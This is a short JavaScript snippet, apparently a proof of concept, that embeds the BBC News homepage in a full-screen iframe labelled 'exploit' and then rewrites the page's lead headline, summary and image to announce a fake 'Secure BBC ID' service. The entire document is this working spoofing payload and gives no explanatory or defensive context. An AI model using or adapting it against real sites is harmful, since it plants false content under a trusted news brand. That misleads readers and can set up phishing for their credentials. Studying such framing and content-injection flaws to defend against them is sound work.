var url="http://www.bbc.co.uk/news";
document.body.innerHTML='<iframe id="exploit" src="' + url + '" width="100%" height="100%" style="border:0px"/>';
setTimeout( function() { 
  var doc = frames['exploit'].contentWindow.document;
  doc.getElementsByClassName('gs-c-promo-heading__title')[0].innerHTML='Secure BBC ID Launched';
  doc.getElementsByClassName('gs-c-promo-summary')[0].innerHTML = "Today BBC is launching its new BBC ID which is super secure, and is able to protect the user's data using state of the art security code."
  doc.getElementsByClassName('gs-o-responsive-image')[0].getElementsByTagName('img')[0].srcset='http://www.bbc.co.uk/staticarchive/bd750f494890387769963209883191f0e0ec9ed3.jpg'
 }, 600)
